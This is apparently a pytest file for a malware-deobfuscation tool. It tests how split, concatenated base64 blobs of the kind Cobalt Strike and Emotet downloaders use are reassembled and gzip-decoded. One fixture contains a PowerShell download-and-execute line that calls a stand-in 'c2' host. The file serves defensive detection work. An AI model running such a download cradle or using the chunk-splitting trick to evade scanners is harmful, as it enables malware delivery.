"""Feb 2026 v1.3.3 · Concatenated-base64 payload reconstruction.

Cobalt Strike / IcedID / Emotet downloaders split their base64 blob across
`'chunk1'+'chunk2'+…'chunkN'` (each chunk optionally containing `{0}`/`{1}`
format-op placeholders). Verify that:

  1. The `extract-b64-concat` op joins 5+ contiguous chunks along a `+` chain
  2. The joined blob is base64-decoded and passed to `_bin_magic_op` for
     eager decompression (H4sI → GZIP)
  3. When the joined blob decompresses cleanly, verdict is Suspicious/Malicious;
     when chunks are truncated, verdict is `Corrupted` (never `Undecoded`).

Ties into the user's "Layered Detonation" saved case which previously
surfaced only a 87-char fragment instead of the full 1815-char gzip stager.
"""
import base64
import gzip

import pytest

from operations import _extract_b64_concat
from smart_decoder import smart_decode


def _build_split_concat(payload: bytes, chunk_size: int = 40) -> str:
    """Encode `payload` as base64, then split into `chunk_size` chunks and
    join with `+` separators inside a PowerShell-style wrapper."""
    b64 = base64.b64encode(payload).decode()
    parts = [b64[i:i + chunk_size] for i in range(0, len(b64), chunk_size)]
    quoted = "+".join(f"'{p}'" for p in parts)
    return f"$payload = {quoted}; [System.Convert]::FromBase64String($payload)"


def test_extract_b64_concat_joins_split_chunks():
    """The op reconstructs a payload split across many quoted chunks."""
    original = b"hello world " * 50
    # chunk_size=16 → ~50 chunks (well above the 5-chunk minimum)
    wrapper = _build_split_concat(original, chunk_size=16)
    joined = _extract_b64_concat(wrapper)
    # Joined should be > any single chunk and decode to the original
    assert len(joined) >= len(base64.b64encode(original)) - 4
    decoded = base64.b64decode(joined + "=" * ((4 - len(joined) % 4) % 4))
    assert original in decoded


def test_smart_decode_reconstructs_gzip_downloader():
    """Full pipeline: split-base64 → concat → base64 → gzip → plaintext."""
    original = b"IEX(New-Object Net.WebClient).DownloadString('http://c2/x.ps1')" * 20
    gz = gzip.compress(original)
    # chunk_size=12 → many small chunks to trigger the 5-chunk minimum easily
    wrapper = _build_split_concat(gz, chunk_size=12)

    result = smart_decode(wrapper)
    chain = [s["op"] for s in result.get("steps", [])]
    out = result.get("output", "")

    assert "extract-b64-concat" in chain, f"concat op never fired · chain={chain}"
    # Full gzip decode should surface the plaintext
    assert "IEX" in out and "DownloadString" in out and "c2" in out, \
        f"gzip plaintext not surfaced · chain={chain} · out[:200]={out[:200]!r}"


def test_smart_decode_flags_truncated_gzip_as_corrupted():
    """When the concat chain reconstructs a partial gzip blob (truncated
    payload), the pipeline must NOT silently swallow — it should reach
    `gzip-decompress` in the chain and later be flagged as Corrupted by
    the verdict card (not tested here — that's evidence_extractor).
    """
    original = b"NIVXRAY_CORRUPTED_GZIP_TEST_" + (b"payload data " * 200)
    gz = gzip.compress(original)
    # Chop off the last 40% of the gzip bytes to simulate truncation
    truncated = gz[: int(len(gz) * 0.6)]
    wrapper = _build_split_concat(truncated, chunk_size=8)
    result = smart_decode(wrapper)
    chain = [s["op"] for s in result.get("steps", [])]
    # concat + b64-decode must still fire; gzip may or may not per corruption
    assert "extract-b64-concat" in chain, chain


def test_ignores_short_concat_chains():
    """< 5 chunks or < 60-char joined blob must NOT trigger concat mode."""
    # Only 3 chunks
    wrapper = "$x = 'AAAA' + 'BBBB' + 'CCCC'"
    result = smart_decode(wrapper)
    chain = [s["op"] for s in result.get("steps", [])]
    assert "extract-b64-concat" not in chain, f"false-positive concat · chain={chain}"


def test_placeholder_chunks_are_cleaned():
    """`{0}` and `{1}` inside chunks are stripped before b64 decode."""
    # Build a proper 6-chunk chain so the {4,}-chunk-minimum passes.
    original = b"NivXray_Concat_Test_Payload_With_Format_Op_Trick_12345"
    b64 = base64.b64encode(original).decode()
    # Split into 6 chunks, inject `{0}` between them
    parts = [b64[i:i + 12] for i in range(0, len(b64), 12)]
    parts_with_ph = [(p + "{0}") if i % 2 == 0 else p for i, p in enumerate(parts)]
    wrapper = "+".join(f"'{c}'" for c in parts_with_ph) + " -f 'a','L'"
    result = smart_decode(wrapper)
    chain = [s["op"] for s in result.get("steps", [])]
    out = result.get("output", "")
    assert "extract-b64-concat" in chain, chain
    assert "NivXray_Concat_Test_Payload" in out, f"cleaned output missing plaintext · {out[:200]!r}"
